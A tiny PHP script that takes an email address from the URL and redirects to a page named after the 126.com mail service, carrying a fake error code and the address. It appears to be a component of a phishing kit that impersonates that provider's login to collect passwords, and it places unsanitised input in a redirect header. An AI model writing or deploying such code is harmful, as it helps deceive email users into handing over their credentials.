<?php
$email = $_GET['email'];
header("Location: vip.126.com.php?errorType=498&error&email=$email");
?>